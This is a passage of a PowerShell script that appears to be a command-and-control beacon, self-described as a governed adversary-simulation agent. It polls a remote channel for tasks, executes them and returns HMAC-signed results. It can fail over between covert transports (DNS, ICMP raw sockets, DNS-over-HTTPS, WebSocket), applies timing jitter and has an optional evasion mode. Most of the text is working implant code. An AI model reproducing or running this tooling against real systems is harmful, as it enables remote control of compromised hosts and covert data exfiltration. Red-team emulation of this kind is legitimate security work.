      catch { Close-Ws; $ms.Dispose(); return $null }
    }
    $waitMs = 30000
    if ($first) { $waitMs = $TimeoutMs }
    $done = $false
    try { $done = $script:WsRecvTask.Wait($waitMs) } catch { Close-Ws; $ms.Dispose(); return $null }
    if (-not $done) {
      if ($first) { $ms.Dispose(); return $null }   # idle timeout - task stays pending
      Close-Ws; $ms.Dispose(); return $null         # a peer that fragments then stalls = dead wire
    }
    $task = $script:WsRecvTask
    $script:WsRecvTask = $null
    if ($task.IsFaulted -or $task.IsCanceled) { Close-Ws; $ms.Dispose(); return $null }
    $r = $task.Result
    if ($null -eq $r) { Close-Ws; $ms.Dispose(); return $null }
    if ($r.MessageType -eq [System.Net.WebSockets.WebSocketMessageType]::Close) { Close-Ws; $ms.Dispose(); return $null }
    if ($r.Count -gt 0) { $ms.Write($script:WsBuf, 0, $r.Count) }
    if ($r.EndOfMessage) {
      $bytes = $ms.ToArray()
      $ms.Dispose()
      return [Text.Encoding]::UTF8.GetString($bytes)
    }
    $first = $false
  }
}
function Send-WsText([string]$Json) {
  if ($null -eq $script:WsSock -or $script:WsSock.State -ne [System.Net.WebSockets.WebSocketState]::Open) { return }
  $bytes = [Text.Encoding]::UTF8.GetBytes($Json)
  $seg = [System.ArraySegment[byte]]::new($bytes)
  $cts = New-Object System.Threading.CancellationTokenSource(10000)
  try { $script:WsSock.SendAsync($seg, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $cts.Token).Wait() }
  catch { Write-Host ('  [ws send failed: ' + $_.Exception.Message + ']'); Close-Ws }
  finally { $cts.Dispose() }
}
function Invoke-WsCycle {
  # One loop iteration on the ws PUSH wire. No pull exists here: the socket not being
  # Open means reconnect (success/fail sets $script:LastPullOk like every pull path);
  # an Open socket drains frames for ~1s - a task frame returns the task object, an
  # expired timeout with the socket still Open is idle-but-heard (wire proven alive).
  if ($null -eq $script:WsSock -or $script:WsSock.State -ne [System.Net.WebSockets.WebSocketState]::Open) {
    Close-Ws
    try { Connect-Ws; $script:LastPullOk = $true }
    catch { Write-Host ('  [ws reconnect failed: ' + $_.Exception.Message + ']'); $script:LastPullOk = $false }
    return $null   # the connect itself is the check-in; flushed frames land next cycle
  }
  $msg = Receive-WsMessage 1000
  if ($null -eq $script:WsSock -or $script:WsSock.State -ne [System.Net.WebSockets.WebSocketState]::Open) {
    $script:LastPullOk = $false   # died mid-drain: the wire is NOT proven alive
    return $null
  }
  if ($null -eq $msg) { $script:LastPullOk = $true; return $null }  # idle-but-heard
  try {
    $t = $msg | ConvertFrom-Json
    # Channel-assigned transport switch rides the task frame as a machine-only key (gap#5).
    if ($t -and $t.setTransport) { $script:AssignedTransport = ([string]$t.setTransport).Trim().ToLower() }
    return $t
  } catch { return $null }
}
function Invoke-WsPush([string]$TaskId, [byte[]]$Body) {
  # Result body as ONE text frame when small; bodies > 32KB reuse the governed chunked
  # {k:'push',t,i,n,d} shape at a 32KB payload chunk (the SAME object shape + per-chunk
  # seq/HMAC as the dns-push pattern - the channel's shared intake reassembles).
  if ($null -eq $script:WsSock -or $script:WsSock.State -ne [System.Net.WebSockets.WebSocketState]::Open) { return }
  # 32766, not 32768: per-chunk base64 bodies are JOINED and decoded as one string by
  # the intake, so every chunk but the last must be a multiple of 3 raw bytes - a
  # mid-stream '=' pad corrupts the joined decode (same reason dns-push chunks at 96).
  $chunkSize = 32766
  $chunks = New-Object System.Collections.Generic.List[string]
  for ($i = 0; $i -lt $Body.Length; $i += $chunkSize) {
    $len = [Math]::Min($chunkSize, $Body.Length - $i)
    $chunk = New-Object byte[] $len
    [Array]::Copy($Body, $i, $chunk, 0, $len)
    $chunks.Add([Convert]::ToBase64String($chunk))
  }
  if ($chunks.Count -eq 0) { $chunks.Add([Convert]::ToBase64String([byte[]]@())) }
  $n = $chunks.Count
  for ($i = 0; $i -lt $n; $i++) {
    $script:Seq++
    $d = $chunks[$i]
    $h = Get-HmacHex $Token ($AgentId + ':' + $script:Seq + ':' + $TaskId + ':' + $i + ':' + $n + ':' + $d)
    $json = ([ordered]@{ a = $AgentId; s = $script:Seq; h = $h; t = $TaskId; k = 'push'; i = $i; n = $n; d = $d } | ConvertTo-Json -Compress)
    Send-WsText $json
    if ($null -eq $script:WsSock) { return }  # send died - stop burning seqs on a dead wire
  }
}

# ---------- transport failover helpers (gap#5) ----------
function Close-Icmp {
  if ($null -ne $script:IcmpSock) { try { $script:IcmpSock.Close() } catch {}; $script:IcmpSock = $null }
}
function Get-TransportLabel([string]$n) { if ($n -eq 'dns-udp') { return 'dns' } return $n }
function Switch-Transport([string]$Name) {
  # Switch the ACTIVE transport. Returns $true when the switch happened. Fail-closed on
  # unknown names. icmp needs a live raw socket: in failover-list mode a refused socket
  # SKIPS icmp (never the single-mode FATAL - a listed agent stays up on its other wires).
  if ($Name -ne 'http' -and $Name -ne 'dns-udp' -and $Name -ne 'dns-http' -and $Name -ne 'icmp' -and $Name -ne 'doh' -and $Name -ne 'ws') { return $false }
  if ($Name -eq $script:Transport) { return $true }
  if ($Name -eq 'icmp' -and $null -eq $script:IcmpSock) {
    try { Connect-Icmp } catch { Write-Host ('  [failover] icmp raw socket refused (' + $_.Exception.Message + ') - skipping icmp'); return $false }
  }
  if ($Name -eq 'doh' -and $null -eq $script:DohPinnedThumb) { Set-DohTlsPin $DohThumbprint }  # the pin travels with the transport
  if ($script:Transport -eq 'icmp') { Close-Icmp }
  if ($script:Transport -eq 'ws') { Close-Ws }   # the PUSH socket does not travel across transports
  $script:Transport = $Name
  return $true
}

# ---------- failover transport list (gap#5) ----------
# -Transports 'http,dns,icmp' = agent-autonomous failover: -FailAfter consecutive dead-wire
# pulls ($script:LastPullOk - see the pull paths) cycle to the NEXT transport in the list.
# $script:Seq KEEPS incrementing across transports (channel strict-seq is agent-global -
# resetting it would break all auth). Empty -Transports = single -Transport, back-compat.
$script:FailoverMode = $false
$script:FailList = @()
$script:FailIdx = 0
$script:FailCount = 0
if ($Transports.Trim().Length -gt 0) {
  $list = @()
  foreach ($t in $Transports.Split(',')) {
    $n = $t.Trim().ToLower()
    if ($n -eq 'dns') { $n = 'dns-udp' }
    if ($n -eq 'http' -or $n -eq 'dns-udp' -or $n -eq 'dns-http' -or $n -eq 'icmp' -or $n -eq 'doh' -or $n -eq 'ws') { $list += $n }
  }
  if ($list.Count -gt 0) {
    $script:FailoverMode = $true
    $script:FailList = $list
    $Transport = $list[0]
  }
}

if ($Transport -eq 'icmp' -and -not $script:FailoverMode) {
  try { Connect-Icmp }
  catch { Write-Host ('FATAL: icmp raw socket refused (' + $_.Exception.Message + ') - run elevated (SYSTEM/admin); staying off the wire.'); exit 1 }
  Write-Host '  icmp raw socket open (elevated) - wire transport live'
}
if ($script:FailoverMode -and ($script:FailList -contains 'icmp')) {
  # List mode: a refused raw socket SKIPS icmp (no FATAL here) - the agent stays up on the rest.
  try { Connect-Icmp; Write-Host '  icmp raw socket open (elevated) - icmp in failover list' }
  catch {
    Write-Host ('  [failover] icmp raw socket refused (' + $_.Exception.Message + ') - icmp dropped from the list (run elevated to keep it)')
    $script:FailList = @($script:FailList | Where-Object { $_ -ne 'icmp' })
    if ($script:FailList.Count -eq 0) { Write-Host 'FATAL: no workable transports in -Transports (icmp needs elevation); staying off the wire.'; exit 1 }
    if ($Transport -eq 'icmp') { $Transport = $script:FailList[0] }
  }
}
if ($script:FailoverMode) {
  $labels = @()
  foreach ($t in $script:FailList) { $labels += (Get-TransportLabel $t) }
  Write-Host ('  failover list: ' + ($labels -join ',') + ' - cycle after ' + $FailAfter + ' dead-wire pulls')
}
if ($Transport -eq 'doh' -or ($script:FailoverMode -and ($script:FailList -contains 'doh'))) {
  # The TLS pin is set ONCE for the process when doh is in play (ServicePointManager is
  # process-global; the callback only ever fires for TLS connections, so the plain-http
  # wire is unaffected). Switch-Transport re-arms it for channel-assigned switches.
  Set-DohTlsPin $DohThumbprint
  Write-Host ('  doh endpoint ' + $DohUrl + ' - TLS pinned to cert sha256 ' + $DohThumbprint.Substring(0, 16) + '... (pin, not bypass)')
}
if ($Transport -eq 'ws' -or ($script:FailoverMode -and ($script:FailList -contains 'ws'))) {
  # No boot-time connect: Invoke-WsCycle (re)connects lazily on its iteration, so a
  # refused handshake in list mode SKIPS like any dead wire instead of a single-mode FATAL.
  Write-Host '  ws push wire in play - tasks arrive as frames on /ws (no poll cadence on this transport)'
}

Write-Host "  governed simulation agent - no persistence. evasion tier: $(if ($AllowEvasion) { 'ARMED (-AllowEvasion; engagement exec.evasion must also be on)' } else { 'OFF (default - no -AllowEvasion)' }). Ctrl-C to exit."
$loops = 0
while ($true) {
  $loops++
  if ($MaxLoops -gt 0 -and $loops -gt $MaxLoops) { break }
  # One pull on the ACTIVE transport; every pull path sets $script:LastPullOk (gap#5).
  # A mid-task heartbeat (wedge guard) may have delivered the next task already - it
  # queues LOCALLY ($script:PendingTasks); drain that first, serial execution preserved,
  # no pull needed this cycle.
  $task = $null
  $pulledThisCycle = $false
  if ($script:PendingTasks.Count -gt 0) {
    $task = $script:PendingTasks[0]
    $script:PendingTasks = @($script:PendingTasks | Select-Object -Skip 1)
  } else {
    $pulledThisCycle = $true
    if ($Transport -eq 'http') { $task = Invoke-Pull }
    elseif ($Transport -eq 'icmp') { $task = Invoke-IcmpPull }
    elseif ($Transport -eq 'doh') { $task = Invoke-DohPull }
    elseif ($Transport -eq 'ws') { $task = Invoke-WsCycle }
    else { $task = Invoke-DnsPull }
  }
  if ($script:FailoverMode -and $pulledThisCycle) {
    $switched = $false
    # SOFT switch first: a channel-assigned transport (x-varvel-transport header on http,
    # setTransport key on dns/icmp) is honored ONLY when locally workable (icmp's
    # elevation guard lives in Switch-Transport) and applies from the next cycle.
    if ($null -ne $script:AssignedTransport) {
      $want = ([string]$script:AssignedTransport).Trim().ToLower()
      $script:AssignedTransport = $null
      if ($want -eq 'dns') { $want = 'dns-udp' }
      if ($want.Length -gt 0 -and $want -ne $Transport) {
        $old = Get-TransportLabel $Transport
        if (Switch-Transport $want) {
          Write-Host ('  [transport] channel assigned ' + $old + ' -> ' + (Get-TransportLabel $Transport))
          $idx = [Array]::IndexOf($script:FailList, $Transport)
          if ($idx -ge 0) { $script:FailIdx = $idx }
          $script:FailCount = 0
          $switched = $true
        } else {
          Write-Host ('  [transport] channel assigned ' + (Get-TransportLabel $want) + ' - not workable here, staying on ' + $old)
        }
      }
    }
    if (-not $switched) {
      if ($script:LastPullOk) {
        $script:FailCount = 0
      } else {
        $script:FailCount++
        if ($script:FailCount -ge $FailAfter) {
          # HARD failure: cycle to the NEXT workable transport in the list, counter reset.
          $old = Get-TransportLabel $Transport
          for ($step = 1; $step -le $script:FailList.Count; $step++) {
            $next = $script:FailList[($script:FailIdx + $step) % $script:FailList.Count]
            if (Switch-Transport $next) {
              $script:FailIdx = ($script:FailIdx + $step) % $script:FailList.Count
              Write-Host ('  [failover] ' + $old + ' failed ' + $FailAfter + 'x -> ' + (Get-TransportLabel $next))
              break
            }
          }
          $script:FailCount = 0
        }
      }
    }
  }
  if ($null -ne $task) {
    $preview = $task.data
    if ($preview.Length -gt 60) { $preview = $preview.Substring(0, 60) }
    $via = Get-TransportLabel $Transport
    Write-Host ('  task(' + $via + ') ' + $task.kind + ': ' + $preview)
    # The loop guard (the MpCmdRun lesson): a THROWING task - any kind - becomes a loud
    # error RESULT pushed back to the channel, never a dead agent. 'delivered-forever'
    # was the wedge's ledger signature; the loop survives by construction now.
    try {
      $result = Invoke-Task $task
    } catch {
      $result = [Text.Encoding]::UTF8.GetBytes('task fault (caught by the loop guard; the task loop survives): ' + ($_.Exception.Message -replace '[\r\n]+', ' '))
    }
    if ($Transport -eq 'http') { Invoke-Push $task.taskId $result }
    elseif ($Transport -eq 'icmp') { Invoke-IcmpPush $task.taskId $result }
    elseif ($Transport -eq 'doh') { Invoke-DohPush $task.taskId $result }
    elseif ($Transport -eq 'ws') { Invoke-WsPush $task.taskId $result }
    else { Invoke-DnsPush $task.taskId $result }
    Write-Host ('  result sent via ' + $via + ' (' + $result.Length + 'b)')
  }
  $gap = $Interval + (Get-Random -Minimum (-$Jitter) -Maximum ($Jitter + 1))
  Start-Sleep -Milliseconds ([Math]::Max(200, $gap))
}
